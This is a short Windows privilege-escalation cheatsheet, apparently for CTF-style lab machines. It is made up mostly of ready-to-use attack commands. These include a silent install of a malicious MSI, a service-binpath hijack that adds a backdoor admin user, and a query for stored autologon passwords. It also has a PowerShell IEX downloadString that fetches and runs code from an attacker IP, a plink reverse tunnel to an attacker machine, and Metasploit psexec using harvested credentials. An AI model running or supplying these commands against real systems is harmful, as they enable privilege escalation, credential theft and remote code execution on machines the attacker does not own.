# Cheatsheet

## MSI

### Installing MSI
```
msiexec /quiet /qn /i malicious.msi
```
```
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

## Services

- Registry entries: `HKLM\SYSTEM\CurrentControlSet\Services`
- View service properties: `sc qc "Vulnerable Service"`
- Restarting: `sc stop "Vulnerable Service"`
- Restart PC: `shutdown /r /t 0`
- Change binary path: `sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add`

### Keep alive
When a service starts in Windows operating systems, it must communicate with the `Service Control Manager`. If it’s not, `Service Control Manager` will terminates the process.

## Auto Save Password to PowerShell
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```
```
​$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)​

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential $creds
```
## Permissions

## View Permisions
```
cacls C:\Users\Administrator\Desktop\root.txt
```

### Grant Permissions
```
cacls C:\Users\Administrator\Desktop\root.txt /grant Alfred:F
```

## SSH from Windows to Attacker (Kali)

### Manual
From Windows:
```
plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8
```

From Attacker:
```
netstat -ano | grep 445
winexe -U Administrator //127.0.0.1 "cmd.exe"
```

### Metasploit
```
portfwd add -l 445 -p 445 -r 127.0.0.1
use exploit/windows/smb/psexec
 set SMBDOMAIN CHATTERBOX
 set SMBUSER Administrators
 set SMBPASS Welcome1!
 set RHOST 127.0.0.1
exploit
```
